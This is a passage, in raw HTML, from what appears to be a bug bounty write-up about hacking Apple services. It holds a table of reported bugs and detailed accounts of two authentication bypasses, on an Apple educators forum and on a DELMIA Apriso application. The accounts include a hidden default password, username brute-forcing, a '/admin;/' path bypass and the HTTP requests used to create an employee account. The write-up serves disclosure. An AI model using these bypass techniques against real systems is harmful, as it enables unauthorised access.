&lt;td class=&quot;has-text-align-center&quot; data-align=&quot;center&quot;&gt;Reflected XSS on Third Party Application allows Attacker to Compromise Application&lt;/td&gt;
&lt;td class=&quot;has-text-align-center&quot; data-align=&quot;center&quot;&gt;Medium&lt;/td&gt;
&lt;td class=&quot;has-text-align-center&quot; data-align=&quot;center&quot;&gt;3&lt;/td&gt;
&lt;/tr&gt;&lt;tr&gt;&lt;td class=&quot;has-text-align-center&quot; data-align=&quot;center&quot;&gt;740651991&lt;/td&gt;
&lt;td class=&quot;has-text-align-center&quot; data-align=&quot;center&quot;&gt;7/15/2020&lt;/td&gt;
&lt;td class=&quot;has-text-align-center&quot; data-align=&quot;center&quot;&gt;Blind XSS from Low Level User to High Level User allows Attacker to Compromise Application&lt;/td&gt;
&lt;td class=&quot;has-text-align-center&quot; data-align=&quot;center&quot;&gt;Medium&lt;/td&gt;
&lt;td class=&quot;has-text-align-center&quot; data-align=&quot;center&quot;&gt;3&lt;/td&gt;
&lt;/tr&gt;&lt;tr&gt;&lt;td class=&quot;has-text-align-center&quot; data-align=&quot;center&quot;&gt;739881737&lt;/td&gt;
&lt;td class=&quot;has-text-align-center&quot; data-align=&quot;center&quot;&gt;7/10/2020&lt;/td&gt;
&lt;td class=&quot;has-text-align-center&quot; data-align=&quot;center&quot;&gt;Reflected XSS allows Attacker to Fully Compromise Tenant Resources&lt;/td&gt;
&lt;td class=&quot;has-text-align-center&quot; data-align=&quot;center&quot;&gt;Medium&lt;/td&gt;
&lt;td class=&quot;has-text-align-center&quot; data-align=&quot;center&quot;&gt;3&lt;/td&gt;
&lt;/tr&gt;&lt;tr&gt;&lt;td class=&quot;has-text-align-center&quot; data-align=&quot;center&quot;&gt;743224534&lt;/td&gt;
&lt;td class=&quot;has-text-align-center&quot; data-align=&quot;center&quot;&gt;8/10/2020&lt;/td&gt;
&lt;td class=&quot;has-text-align-center&quot; data-align=&quot;center&quot;&gt;Stored XSS via Unrestricted File Upload&lt;/td&gt;
&lt;td class=&quot;has-text-align-center&quot; data-align=&quot;center&quot;&gt;Medium&lt;/td&gt;
&lt;td class=&quot;has-text-align-center&quot; data-align=&quot;center&quot;&gt;3&lt;/td&gt;
&lt;/tr&gt;&lt;tr&gt;&lt;td class=&quot;has-text-align-center&quot; data-align=&quot;center&quot;&gt;743675794&lt;/td&gt;
&lt;td class=&quot;has-text-align-center&quot; data-align=&quot;center&quot;&gt;8/14/2020&lt;/td&gt;
&lt;td class=&quot;has-text-align-center&quot; data-align=&quot;center&quot;&gt;Reflected XSS via Unsanitized Parameter&lt;/td&gt;
&lt;td class=&quot;has-text-align-center&quot; data-align=&quot;center&quot;&gt;Medium&lt;/td&gt;
&lt;td class=&quot;has-text-align-center&quot; data-align=&quot;center&quot;&gt;3&lt;/td&gt;
&lt;/tr&gt;&lt;tr&gt;&lt;td class=&quot;has-text-align-center&quot; data-align=&quot;center&quot;&gt;744068810&lt;/td&gt;
&lt;td class=&quot;has-text-align-center&quot; data-align=&quot;center&quot;&gt;8/16/2020&lt;/td&gt;
&lt;td class=&quot;has-text-align-center&quot; data-align=&quot;center&quot;&gt;Reflected XSS via Unsanitized Parameter&lt;/td&gt;
&lt;td class=&quot;has-text-align-center&quot; data-align=&quot;center&quot;&gt;Medium&lt;/td&gt;
&lt;td class=&quot;has-text-align-center&quot; data-align=&quot;center&quot;&gt;3&lt;/td&gt;
&lt;/tr&gt;&lt;tr&gt;&lt;td class=&quot;has-text-align-center&quot; data-align=&quot;center&quot;&gt;744392545&lt;/td&gt;
&lt;td class=&quot;has-text-align-center&quot; data-align=&quot;center&quot;&gt;8/21/2020&lt;/td&gt;
&lt;td class=&quot;has-text-align-center&quot; data-align=&quot;center&quot;&gt;Information Disclosure via IDOR&lt;/td&gt;
&lt;td class=&quot;has-text-align-center&quot; data-align=&quot;center&quot;&gt;Medium&lt;/td&gt;
&lt;td class=&quot;has-text-align-center&quot; data-align=&quot;center&quot;&gt;3&lt;/td&gt;
&lt;/tr&gt;&lt;tr&gt;&lt;td class=&quot;has-text-align-center&quot; data-align=&quot;center&quot;&gt;744634880&lt;/td&gt;
&lt;td class=&quot;has-text-align-center&quot; data-align=&quot;center&quot;&gt;8/24/2020&lt;/td&gt;
&lt;td class=&quot;has-text-align-center&quot; data-align=&quot;center&quot;&gt;Stored XSS on Apple Application&lt;/td&gt;
&lt;td class=&quot;has-text-align-center&quot; data-align=&quot;center&quot;&gt;Medium&lt;/td&gt;
&lt;td class=&quot;has-text-align-center&quot; data-align=&quot;center&quot;&gt;3&lt;/td&gt;
&lt;/tr&gt;&lt;tr&gt;&lt;td class=&quot;has-text-align-center&quot; data-align=&quot;center&quot;&gt;744991374&lt;/td&gt;
&lt;td class=&quot;has-text-align-center&quot; data-align=&quot;center&quot;&gt;8/27/2020&lt;/td&gt;
&lt;td class=&quot;has-text-align-center&quot; data-align=&quot;center&quot;&gt;Reflected XSS via Unsanitized Parameter&lt;/td&gt;
&lt;td class=&quot;has-text-align-center&quot; data-align=&quot;center&quot;&gt;Medium&lt;/td&gt;
&lt;td class=&quot;has-text-align-center&quot; data-align=&quot;center&quot;&gt;3&lt;/td&gt;
&lt;/tr&gt;&lt;tr&gt;&lt;td class=&quot;has-text-align-center&quot; data-align=&quot;center&quot;&gt;746153073&lt;/td&gt;
&lt;td class=&quot;has-text-align-center&quot; data-align=&quot;center&quot;&gt;9/9/2020&lt;/td&gt;
&lt;td class=&quot;has-text-align-center&quot; data-align=&quot;center&quot;&gt;Reflected XSS via Unsanitized Parameter&lt;/td&gt;
&lt;td class=&quot;has-text-align-center&quot; data-align=&quot;center&quot;&gt;Medium&lt;/td&gt;
&lt;td class=&quot;has-text-align-center&quot; data-align=&quot;center&quot;&gt;3&lt;/td&gt;
&lt;/tr&gt;&lt;tr&gt;&lt;td class=&quot;has-text-align-center&quot; data-align=&quot;center&quot;&gt;740352583&lt;/td&gt;
&lt;td class=&quot;has-text-align-center&quot; data-align=&quot;center&quot;&gt;7/16/2020&lt;/td&gt;
&lt;td class=&quot;has-text-align-center&quot; data-align=&quot;center&quot;&gt;Information Disclosure via Stack Trace&lt;/td&gt;
&lt;td class=&quot;has-text-align-center&quot; data-align=&quot;center&quot;&gt;Medium&lt;/td&gt;
&lt;td class=&quot;has-text-align-center&quot; data-align=&quot;center&quot;&gt;3&lt;/td&gt;
&lt;/tr&gt;&lt;tr&gt;&lt;td class=&quot;has-text-align-center&quot; data-align=&quot;center&quot;&gt;742387948&lt;/td&gt;
&lt;td class=&quot;has-text-align-center&quot; data-align=&quot;center&quot;&gt;8/1/2020&lt;/td&gt;
&lt;td class=&quot;has-text-align-center&quot; data-align=&quot;center&quot;&gt;Login Form with No Rate Limiting&lt;/td&gt;
&lt;td class=&quot;has-text-align-center&quot; data-align=&quot;center&quot;&gt;Low&lt;/td&gt;
&lt;td class=&quot;has-text-align-center&quot; data-align=&quot;center&quot;&gt;4&lt;/td&gt;
&lt;/tr&gt;&lt;tr&gt;&lt;td class=&quot;has-text-align-center&quot; data-align=&quot;center&quot;&gt;744276140&lt;/td&gt;
&lt;td class=&quot;has-text-align-center&quot; data-align=&quot;center&quot;&gt;8/20/2020&lt;/td&gt;
&lt;td class=&quot;has-text-align-center&quot; data-align=&quot;center&quot;&gt;Information Disclosure on Third Party Website&lt;/td&gt;
&lt;td class=&quot;has-text-align-center&quot; data-align=&quot;center&quot;&gt;Low&lt;/td&gt;
&lt;td class=&quot;has-text-align-center&quot; data-align=&quot;center&quot;&gt;4&lt;/td&gt;
&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;p/&gt;
&lt;h2&gt;Vulnerability Write-Ups&lt;/h2&gt;
&lt;p&gt;We can’t write about all the vulnerabilities we discovered, but here is a sample of some of the more interesting vulnerabilities.&lt;/p&gt;
&lt;ol&gt;&lt;li&gt;&lt;a href=&quot;https://samcurry.net/hacking-apple/#vuln1&quot;&gt;Full Compromise of Apple Distinguished Educators Program via Authentication and Authorization Bypass&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://samcurry.net/hacking-apple/#vuln2&quot;&gt;Full Compromise of DELMIA Apriso Application via Authentication Bypass&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://samcurry.net/hacking-apple/#vuln3&quot;&gt;Wormable Stored Cross-Site Scripting Vulnerabilities Allow Attacker to Steal iCloud Data through a Modified Email&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://samcurry.net/hacking-apple/#vuln4&quot;&gt;Command Injection in Author’s ePublisher&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://samcurry.net/hacking-apple/#vuln5&quot;&gt;Full Response SSRF on iCloud allows Attacker to Retrieve Apple Source Code&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://samcurry.net/hacking-apple/#vuln6&quot;&gt;Nova Admin Debug Panel Access via REST Error Leak&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://samcurry.net/hacking-apple/#vuln7&quot;&gt;AWS Secret Keys via PhantomJS iTune Banners and Book Title XSS&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://samcurry.net/hacking-apple/#vuln8&quot;&gt;Heap Dump on Apple eSign Allows Attacker to Compromise Various External Employee Management Tools&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://samcurry.net/hacking-apple/#vuln9&quot;&gt;XML External Entity processing to Blind SSRF on Java Management API&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://samcurry.net/hacking-apple/#vuln10&quot;&gt;GBI Vertica SQL Injection and Exposed GSF API&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://samcurry.net/hacking-apple/#vuln11&quot;&gt;Various IDOR Vulnerabilities&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://samcurry.net/hacking-apple/#vuln12&quot;&gt;Various Blind XSS Vulnerabilities&lt;/a&gt;&lt;/li&gt;
&lt;/ol&gt;&lt;div id=&quot;vuln1&quot; class=&quot;section&quot;&gt;
&lt;h2&gt;Full Compromise of Apple Distinguished Educators Program via Authentication and Authorization Bypass&lt;/h2&gt;
&lt;p&gt;One of the first services we spent time hacking was the “Apple Distinguished Educators” site. This was an invitation-only Jive forum where users could authenticate using their Apple account. Something interesting about this forum was that some of the core Jive functionality to register to the app was ported through a custom middleware page built by Apple in order to connect their authentication system (IDMSA) to the underlying Jive forum which normally used username/password authentication.&lt;/p&gt;
&lt;img loading=&quot;lazy&quot; width=&quot;1024&quot; height=&quot;435&quot; class=&quot;wp-image-1176&quot; src=&quot;https://secureservercdn.net/198.71.233.197/623.f31.myftpupload.com/wp-content/uploads/2020/08/ade_screen-1024x435.png&quot; alt=&quot;&quot; srcset=&quot;https://secureservercdn.net/198.71.233.197/623.f31.myftpupload.com/wp-content/uploads/2020/08/ade_screen-1024x435.png 1024w, https://secureservercdn.net/198.71.233.197/623.f31.myftpupload.com/wp-content/uploads/2020/08/ade_screen-300x128.png 300w, https://secureservercdn.net/198.71.233.197/623.f31.myftpupload.com/wp-content/uploads/2020/08/ade_screen-768x327.png 768w, https://secureservercdn.net/198.71.233.197/623.f31.myftpupload.com/wp-content/uploads/2020/08/ade_screen.png 1183w&quot; sizes=&quot;(max-width: 1024px) 100vw, 1024px&quot;/&gt;&lt;p&gt;This was built to allow users to easily use their already existing Apple account to authenticate to the forum and not have to deal with creating an additional user account. You would simply use the “Sign In With Apple” and be logged into the forum.&lt;/p&gt;
&lt;p&gt;The landing page for users who were not allowed to access the forum was an application portal where you provided information about yourself that was assessed by the forum moderators for approval.&lt;/p&gt;
&lt;img loading=&quot;lazy&quot; width=&quot;1002&quot; height=&quot;288&quot; class=&quot;wp-image-1258&quot; src=&quot;https://secureservercdn.net/198.71.233.197/623.f31.myftpupload.com/wp-content/uploads/2020/08/ade_reg_upda.png&quot; alt=&quot;&quot; srcset=&quot;https://secureservercdn.net/198.71.233.197/623.f31.myftpupload.com/wp-content/uploads/2020/08/ade_reg_upda.png 1002w, https://secureservercdn.net/198.71.233.197/623.f31.myftpupload.com/wp-content/uploads/2020/08/ade_reg_upda-300x86.png 300w, https://secureservercdn.net/198.71.233.197/623.f31.myftpupload.com/wp-content/uploads/2020/08/ade_reg_upda-768x221.png 768w&quot; sizes=&quot;(max-width: 1002px) 100vw, 1002px&quot;/&gt;&lt;p&gt;When you submitted an application to use the forum, you supplied nearly all of the values of your account as if you were registering to the Jive forum normally. This would allow the Jive forum to know who you were based on your IDMSA cookie since it tied your email address belonging to your Apple account to the forum.&lt;/p&gt;
&lt;p&gt;One of the values that was hidden on the page within the application to register to use the forum was a “password” field with the value “&lt;em&gt;###INvALID#%!3&lt;/em&gt;”. When you submitted your application that included your username, first and last name, email address, and employer, you were also submitting a “password” value which was then secretly tied to your account sourced from a hidden input field on the page.&lt;/p&gt;
&lt;pre class=&quot;wp-block-code&quot;&gt;
&lt;code&gt;&amp;lt;div class=&quot;j-form-row&quot;&amp;gt;
&amp;lt;input id=&quot;password&quot; type=&quot;hidden&quot; value=&quot;###INvALID#%!3&quot;&amp;gt;
&amp;lt;div id=&quot;jive-pw-strength&quot;&amp;gt;
...&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;After observing the hidden default password field, we immediately had the idea to find a way to manually authenticate to the application and access an approved account for the forum instead of attempting to login using the “Sign In With Apple” system. We investigated this because the password was the same for each one of us on our separate registrations.&lt;/p&gt;
&lt;p&gt;If anyone had applied using this system and there existed functionality where you could manually authenticate, you could simply login to their account using the default password and completely bypass the &quot;Sign In With Apple&quot; login.&lt;/p&gt;
&lt;p&gt;From a quick glance, it did not appear that you could manually authenticate, but after a few Google searches we identified a “cs_login” endpoint which was meant for logging in with a username and password to Jive applications. When we manually formed the test HTTP request to authenticate to the Apple Distinguished Developers application, we found that it attempted to authenticate us by displaying an incorrect password error. When we used our own accounts that we had previously applied with, the application errored out and did not allow us to authenticate as we were not yet approved. We would have to find the username of an already approved member if we wanted to authenticate.&lt;/p&gt;
&lt;img loading=&quot;lazy&quot; width=&quot;501&quot; height=&quot;221&quot; class=&quot;wp-image-1178&quot; src=&quot;https://secureservercdn.net/198.71.233.197/623.f31.myftpupload.com/wp-content/uploads/2020/08/jive_authentication.png&quot; alt=&quot;&quot; srcset=&quot;https://secureservercdn.net/198.71.233.197/623.f31.myftpupload.com/wp-content/uploads/2020/08/jive_authentication.png 501w, https://secureservercdn.net/198.71.233.197/623.f31.myftpupload.com/wp-content/uploads/2020/08/jive_authentication-300x132.png 300w&quot; sizes=&quot;(max-width: 501px) 100vw, 501px&quot;/&gt;&lt;p&gt;At this point, we loaded the HTTP request into Burp Suite’s intruder and attempted to brute force usernames between 1 and 3 characters via the login and default password.&lt;/p&gt;
&lt;p&gt;After about two minutes we received a 302 response indicating a successful login to the username “erb” with the default password. We were in! From this point, our next goal was to authenticate as someone with elevated permissions. We took a few screenshots of our access and clicked the “Users” list to view which users were administrators. We logged into the first account we saw on the list in an attempt to prove we could achieve remote code execution via the administrative functionality, however, there were still a few roadblocks ahead.&lt;/p&gt;
&lt;img loading=&quot;lazy&quot; width=&quot;1024&quot; height=&quot;529&quot; class=&quot;wp-image-1187&quot; src=&quot;https://secureservercdn.net/198.71.233.197/623.f31.myftpupload.com/wp-content/uploads/2020/08/ade_x-1024x529.png&quot; alt=&quot;&quot; srcset=&quot;https://secureservercdn.net/198.71.233.197/623.f31.myftpupload.com/wp-content/uploads/2020/08/ade_x-1024x529.png 1024w, https://secureservercdn.net/198.71.233.197/623.f31.myftpupload.com/wp-content/uploads/2020/08/ade_x-300x155.png 300w, https://secureservercdn.net/198.71.233.197/623.f31.myftpupload.com/wp-content/uploads/2020/08/ade_x-768x397.png 768w, https://secureservercdn.net/198.71.233.197/623.f31.myftpupload.com/wp-content/uploads/2020/08/ade_x.png 1039w&quot; sizes=&quot;(max-width: 1024px) 100vw, 1024px&quot;/&gt;&lt;p&gt;When attempting to browse to “/admin/” (the Jive administrator console) as the admin account, the application redirected to login as if we were not yet authenticated. This was strange, as it was custom behavior for the Jive application and none of us had observed this before. Our guess was that Apple had restricted the administration console based on IP address to make sure that there was never a full compromise of the application.&lt;/p&gt;
&lt;p&gt;One of the first things we tried was using the X-Forwarded-For header to bypass the hypothetical restriction, but sadly that failed. The next thing we tried was to load a different form of “/admin/” in-case the application had path specific blacklists for accessing the administrator console.&lt;/p&gt;
&lt;p&gt;After just a few more HTTP requests, we figured out that “GET /admin;/” would allow an attacker to access the administration console. We automated this bypass by setting up a Burp Suite rule which automatically changed “GET/POST /admin/” to “GET/POST /admin;/” in our HTTP requests.&lt;/p&gt;
&lt;img loading=&quot;lazy&quot; width=&quot;675&quot; height=&quot;140&quot; class=&quot;wp-image-1268&quot; src=&quot;https://secureservercdn.net/198.71.233.197/623.f31.myftpupload.com/wp-content/uploads/2020/08/match_and_replace.png&quot; alt=&quot;&quot; srcset=&quot;https://secureservercdn.net/198.71.233.197/623.f31.myftpupload.com/wp-content/uploads/2020/08/match_and_replace.png 675w, https://secureservercdn.net/198.71.233.197/623.f31.myftpupload.com/wp-content/uploads/2020/08/match_and_replace-300x62.png 300w&quot; sizes=&quot;(max-width: 675px) 100vw, 675px&quot;/&gt;&lt;p&gt;When we finally navigated and loaded the administration console, it was immediately clear that something wasn’t right. We did not have access to the normal functionality that would demonstrate remote code execution (there was no templating, plugin upload, nor the standard administrative debugging functionality).&lt;/p&gt;
&lt;img loading=&quot;lazy&quot; width=&quot;1024&quot; height=&quot;388&quot; class=&quot;wp-image-1180&quot; src=&quot;https://secureservercdn.net/198.71.233.197/623.f31.myftpupload.com/wp-content/uploads/2020/08/welcome_to_jive-1024x388.png&quot; alt=&quot;&quot; srcset=&quot;https://secureservercdn.net/198.71.233.197/623.f31.myftpupload.com/wp-content/uploads/2020/08/welcome_to_jive-1024x388.png 1024w, https://secureservercdn.net/198.71.233.197/623.f31.myftpupload.com/wp-content/uploads/2020/08/welcome_to_jive-300x114.png 300w, https://secureservercdn.net/198.71.233.197/623.f31.myftpupload.com/wp-content/uploads/2020/08/welcome_to_jive-768x291.png 768w, https://secureservercdn.net/198.71.233.197/623.f31.myftpupload.com/wp-content/uploads/2020/08/welcome_to_jive.png 1361w&quot; sizes=&quot;(max-width: 1024px) 100vw, 1024px&quot;/&gt;&lt;p&gt;At this point, we stopped to think about where we were and realized that the account we authenticated to may not be the “core” administrator of the application. We went ahead and authenticated to 2-3 more accounts before finally authenticating as the core administrator and seeing functionality that would allow for remote code execution.&lt;/p&gt;
&lt;img loading=&quot;lazy&quot; width=&quot;1024&quot; height=&quot;477&quot; class=&quot;wp-image-1182&quot; src=&quot;https://secureservercdn.net/198.71.233.197/623.f31.myftpupload.com/wp-content/uploads/2020/08/jive_home-1024x477.png&quot; alt=&quot;&quot; srcset=&quot;https://secureservercdn.net/198.71.233.197/623.f31.myftpupload.com/wp-content/uploads/2020/08/jive_home-1024x477.png 1024w, https://secureservercdn.net/198.71.233.197/623.f31.myftpupload.com/wp-content/uploads/2020/08/jive_home-300x140.png 300w, https://secureservercdn.net/198.71.233.197/623.f31.myftpupload.com/wp-content/uploads/2020/08/jive_home-768x358.png 768w, https://secureservercdn.net/198.71.233.197/623.f31.myftpupload.com/wp-content/uploads/2020/08/jive_home.png 1102w&quot; sizes=&quot;(max-width: 1024px) 100vw, 1024px&quot;/&gt;&lt;p&gt;An attacker could (1) bypass the authentication by manually authenticating using a hidden default login functionality, then (2) access the administration console via sending a modified HTTP path in the request, and finally (3) completely compromise the application by using the one of many “baked in RCE” functionalities like plugin upload, templating, or file management.&lt;/p&gt;
&lt;p&gt;Overall, this would've allowed an attacker to...&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;Execute arbitrary commands on the ade.apple.com webserver&lt;/li&gt;
&lt;li&gt;Access the internal LDAP service for managing user accounts&lt;/li&gt;
&lt;li&gt;Access the majority of Apple's internal network&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;At this point, we finished the report and submitted everything.&lt;/p&gt;
&lt;/div&gt;
&lt;div id=&quot;vuln2&quot; class=&quot;section&quot;&gt;
&lt;h2&gt;Full Compromise of DELMIA Apriso Application via Authentication Bypass&lt;/h2&gt;
&lt;p&gt;Something we had thought about a lot while hacking Apple was whether or not they had any accessible services relating to the manufacturing and distribution of their products. As it turns out, there was an application called &quot;DELMIA Apriso&quot; which was a third-party &quot;Global Manufacturing Suite&quot; which provided what appeared to be various warehouse solutions.&lt;/p&gt;
&lt;img loading=&quot;lazy&quot; width=&quot;854&quot; height=&quot;345&quot; class=&quot;wp-image-1365&quot; src=&quot;https://secureservercdn.net/198.71.233.197/623.f31.myftpupload.com/wp-content/uploads/2020/10/DELMIA_Apriso_2016_ProductMap_000.png&quot; alt=&quot;&quot; srcset=&quot;https://secureservercdn.net/198.71.233.197/623.f31.myftpupload.com/wp-content/uploads/2020/10/DELMIA_Apriso_2016_ProductMap_000.png 854w, https://secureservercdn.net/198.71.233.197/623.f31.myftpupload.com/wp-content/uploads/2020/10/DELMIA_Apriso_2016_ProductMap_000-300x121.png 300w, https://secureservercdn.net/198.71.233.197/623.f31.myftpupload.com/wp-content/uploads/2020/10/DELMIA_Apriso_2016_ProductMap_000-768x310.png 768w&quot; sizes=&quot;(max-width: 854px) 100vw, 854px&quot;/&gt;&lt;p&gt;Sadly, there did not appear to be much available interaction for the technology as you could only &quot;login&quot; and &quot;reset password&quot; from the available interfaces.&lt;/p&gt;
&lt;img loading=&quot;lazy&quot; width=&quot;1024&quot; height=&quot;364&quot; class=&quot;wp-image-1352&quot; src=&quot;https://secureservercdn.net/198.71.233.197/623.f31.myftpupload.com/wp-content/uploads/2020/10/colormasters-1024x364.png&quot; alt=&quot;&quot; srcset=&quot;https://secureservercdn.net/198.71.233.197/623.f31.myftpupload.com/wp-content/uploads/2020/10/colormasters-1024x364.png 1024w, https://secureservercdn.net/198.71.233.197/623.f31.myftpupload.com/wp-content/uploads/2020/10/colormasters-300x107.png 300w, https://secureservercdn.net/198.71.233.197/623.f31.myftpupload.com/wp-content/uploads/2020/10/colormasters-768x273.png 768w, https://secureservercdn.net/198.71.233.197/623.f31.myftpupload.com/wp-content/uploads/2020/10/colormasters.png 1197w&quot; sizes=&quot;(max-width: 1024px) 100vw, 1024px&quot;/&gt;&lt;p&gt;After attempting to find vulnerabilities on the limited number of pages, something strange happened: we were authenticated as a user called &quot;Apple No Password User&quot; based on a bar which appeared in the upper right portion of the site.&lt;/p&gt;
&lt;div class=&quot;wp-block-image&quot;&gt;&lt;img loading=&quot;lazy&quot; width=&quot;536&quot; height=&quot;79&quot; class=&quot;wp-image-1354&quot; src=&quot;https://secureservercdn.net/198.71.233.197/623.f31.myftpupload.com/wp-content/uploads/2020/10/app_no_pw.png&quot; alt=&quot;&quot; srcset=&quot;https://secureservercdn.net/198.71.233.197/623.f31.myftpupload.com/wp-content/uploads/2020/10/app_no_pw.png 536w, https://secureservercdn.net/198.71.233.197/623.f31.myftpupload.com/wp-content/uploads/2020/10/app_no_pw-300x44.png 300w&quot; sizes=&quot;(max-width: 536px) 100vw, 536px&quot;/&gt;&lt;/div&gt;
&lt;p&gt;What had happened was that, by clicking &quot;Reset Password&quot;, we were temporarily authenticated as a user who had &quot;Permission&quot; to use the page.&lt;/p&gt;
&lt;p&gt;The application's authentication model worked whereas users had specific permissions to use specific pages. The &quot;reset password&quot; page counted as a page itself, so in order to let us use it, the application automatically logged us into an account that was capable of using the page.&lt;/p&gt;
&lt;p&gt;We attempted a variety of things in order to elevate our permissions but didn't seem to get anywhere for a long time. After a while, we sent an HTTP request to an OAuth endpoint in an attempt to generate an authorization bearer that we could use to explore the API. This was successful!&lt;/p&gt;
&lt;p&gt;Our user account, even though its permissions were intended to be limited to authorization and resetting our password, could generate a bearer which had permission to access the API version of the application.&lt;/p&gt;
&lt;img loading=&quot;lazy&quot; width=&quot;1024&quot; height=&quot;179&quot; class=&quot;wp-image-1355&quot; src=&quot;https://secureservercdn.net/198.71.233.197/623.f31.myftpupload.com/wp-content/uploads/2020/10/req-rez-1024x179.png&quot; alt=&quot;&quot; srcset=&quot;https://secureservercdn.net/198.71.233.197/623.f31.myftpupload.com/wp-content/uploads/2020/10/req-rez-1024x179.png 1024w, https://secureservercdn.net/198.71.233.197/623.f31.myftpupload.com/wp-content/uploads/2020/10/req-rez-300x53.png 300w, https://secureservercdn.net/198.71.233.197/623.f31.myftpupload.com/wp-content/uploads/2020/10/req-rez-768x134.png 768w, https://secureservercdn.net/198.71.233.197/623.f31.myftpupload.com/wp-content/uploads/2020/10/req-rez-1536x269.png 1536w, https://secureservercdn.net/198.71.233.197/623.f31.myftpupload.com/wp-content/uploads/2020/10/req-rez-1600x280.png 1600w, https://secureservercdn.net/198.71.233.197/623.f31.myftpupload.com/wp-content/uploads/2020/10/req-rez.png 1891w&quot; sizes=&quot;(max-width: 1024px) 100vw, 1024px&quot;/&gt;&lt;p&gt;We were now able to explore the API and hopefully find some permission issue which would allow us to compromise some portion of the application. Luckily, during our recon process, we found a list of API requests for the application.&lt;/p&gt;
&lt;img loading=&quot;lazy&quot; width=&quot;1000&quot; height=&quot;639&quot; class=&quot;wp-image-1357&quot; src=&quot;https://secureservercdn.net/198.71.233.197/623.f31.myftpupload.com/wp-content/uploads/2020/10/web_api_ref.png&quot; alt=&quot;&quot; srcset=&quot;https://secureservercdn.net/198.71.233.197/623.f31.myftpupload.com/wp-content/uploads/2020/10/web_api_ref.png 1000w, https://secureservercdn.net/198.71.233.197/623.f31.myftpupload.com/wp-content/uploads/2020/10/web_api_ref-300x192.png 300w, https://secureservercdn.net/198.71.233.197/623.f31.myftpupload.com/wp-content/uploads/2020/10/web_api_ref-768x491.png 768w&quot; sizes=&quot;(max-width: 1000px) 100vw, 1000px&quot;/&gt;&lt;p&gt;We sadly did not have access to the majority of the API calls, but some sections like &quot;Operations&quot; disclosed a massive number of available functionalities.&lt;/p&gt;
&lt;p&gt;If you hit the &quot;/Apriso/HttpServices/api/platform/1/Operations&quot; endpoint, it would return a list of nearly 5,000 different API calls. None of these required authentication beyond the initial authorization bearer we initially sent. The operations disclosed here included things like...&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;Creating and modifying shipments&lt;/li&gt;
&lt;li&gt;Creating and modifying employee paydays&lt;/li&gt;
&lt;li&gt;Creating and modifying inventory information&lt;/li&gt;
&lt;li&gt;Validating employee badges&lt;/li&gt;
&lt;li&gt;Hundreds of warehouse related operations&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;The one that we paid most attention to was &quot;APL_CreateEmployee_SO&quot;.&lt;/p&gt;
&lt;p&gt;You could send a GET request to the specific operations and receive the expected parameters using the following format:&lt;/p&gt;
&lt;pre class=&quot;wp-block-code&quot;&gt;
&lt;code&gt;GET /Apriso/HttpServices/api/platform/1/Operations/operation HTTP/1.1
Host: colormasters.apple.com&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;With the following HTTP response:&lt;/p&gt;
&lt;pre class=&quot;wp-block-code&quot;&gt;
&lt;code&gt;{
  &quot;InputTypes&quot;: {
    &quot;OrderNo&quot;: &quot;Char&quot;,
    &quot;OrderType&quot;: &quot;Integer&quot;,
    &quot;OprSequenceNo&quot;: &quot;Char&quot;,
    &quot;Comments&quot;: &quot;Char&quot;,
    &quot;strStatus&quot;: &quot;Char&quot;,
    &quot;UserName&quot;: &quot;Char&quot;
  },
  &quot;OutputTypes&quot;: {},
  &quot;OperationCode&quot;: &quot;APL_Redacted&quot;,
  &quot;OperationRevision&quot;: &quot;APL.I.1.4&quot;
}&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;It took a bit of time, but after a while we realized that in order to actually call the API you had to send a POST request with JSON data in the following format:&lt;/p&gt;
&lt;pre class=&quot;wp-block-code&quot;&gt;
&lt;code&gt;{
  &quot;inputs&quot;: {
    &quot;param&quot;: &quot;value&quot;
  }
}&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;The above format (after the fact) appears very simple and easy to understand, but at the time of hacking we had absolutely no idea how to form this call. I had even tried emailing the company who provided the software asking how you were supposed to form these API calls, but they wouldn't respond to my email because I didn't have a subscription to the service.&lt;/p&gt;
&lt;p&gt;I'd spent nearly 6 hours trying to figure out how to form the above API call, but after we figured it out, it was very much smooth sailing. The &quot;create employee&quot; function required various parameters that relied on UUIDs, but we were able to retrieve these via the other &quot;Operations&quot; and fill them in as we went along.&lt;/p&gt;
&lt;p&gt;About two hours more, we finally formed the following API request:&lt;/p&gt;
&lt;pre class=&quot;wp-block-code&quot;&gt;
&lt;code&gt;POST /Apriso/HttpServices/api/platform/1/Operations/redacted HTTP/1.1
Host: colormasters.apple.com
Authorization: Bearer redacted
Connection: close
Content-Type: application/json
Content-Length: 380
{
  &quot;inputs&quot;: {
    &quot;Name&quot;: &quot;Samuel Curry&quot;,
    &quot;EmployeeNo&quot;: &quot;redacted&quot;,
    &quot;LoginName&quot;: &quot;yourloginname123&quot;,
    &quot;Password&quot;: &quot;yourpassword123&quot;,
    &quot;LanguageID&quot;: &quot;redacted&quot;,
    &quot;AddressID&quot;: &quot;redacted&quot;,
    &quot;ContactID&quot;: &quot;redacted&quot;,
    &quot;DefaultFacility&quot;: &quot;redacted&quot;,
    &quot;Department&quot;: &quot;&quot;,
    &quot;DefaultMenuItemID&quot;: &quot;redacted&quot;,
    &quot;RoleName&quot;: &quot;redacted&quot;,
    &quot;WorkCenter&quot;: &quot;&quot;
  }
}&lt;/code&gt;
&lt;/pre&gt;
